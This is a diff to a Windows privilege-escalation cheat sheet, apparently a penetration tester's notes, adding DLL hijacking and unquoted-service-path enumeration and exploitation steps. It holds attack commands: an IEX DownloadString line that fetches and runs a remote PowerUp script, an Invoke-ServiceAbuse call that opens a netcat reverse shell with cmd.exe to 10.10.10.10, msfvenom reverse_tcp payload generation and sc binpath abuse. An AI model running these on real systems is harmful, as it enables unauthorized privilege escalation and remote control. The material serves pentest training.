@@ -322,6 +322,17 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] -f exe -o x.exe
 - Fire up the multi/handler in msfconsole(for this example, set the payload to windows/meterpreter/reverse_tcp)
 
 ## DLL Hijacking
+### Enumeration
+- Process Monitor
+Set Filters
+```
+Result is NAME NOT FOUND then Include
+Path ends with .dll then Include
+Apply & OK
+# Look for dll's in writable folders (C:\Program Files, C:\Temp, etc.)
+```
+### Exploitation
+To exploit, drop a malicious dll (either replace or supply the missing one) and restart the service
 
 ## Service Permissions
 ### Binary Paths
@@ -343,16 +354,35 @@ Invoke-AllChecks
 sc config [svcname] binpath="[command or path to malicious executable]"
 sc start [svcname]
 ```
-### Unquoted service paths
-> If the service path is not enclosed in quotes, windows will try to execute any executable with the same name as a folder with a space. For example: Service path is c:\windows\Program Files\some executable.exe, if you drop a malicious executable in c:\windows named Program.exe, it will attempt to execute that. Basically your executable can be named anything preceding the space and put in the parent directory.   
+### Unquoted Service Paths
+The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.   
 
 #### Enumeration
-- PowerUp.ps1
 ```shell
-powershell -ep bypass
-. .\PowerUp.ps1
-Invoke-AllChecks
+# in CMD
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\" |findstr /i /v """
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
+# in PowerShell
+gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
+- PowerUP
+```shell
+# find the vulnerable application
+C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+
+...
+[*] Checking for unquoted service paths...
+ServiceName   : BBSvc
+Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
+StartName     : LocalSystem
+AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
+...
+
+# automatic exploit
+Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+```
+- Metasploit: `exploit/windows/local/trusted_service_path`
+
 - winPEAS
 Check for unquoted services in the services section
 ```shell
@@ -365,6 +395,12 @@ Check for unquoted services in the services section
 ```
 #### Exploitation
 - Drop an executable with the same name as a folder that has a space in it. See example above.
+
+#### Example
+
+For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
+* `C:\Program.exe`
+* `C:\Program Files.exe`
 
 ## CVE-2019-1388
 ### CVE-2019-1388 Abuse UAC Windows Certificate Dialog
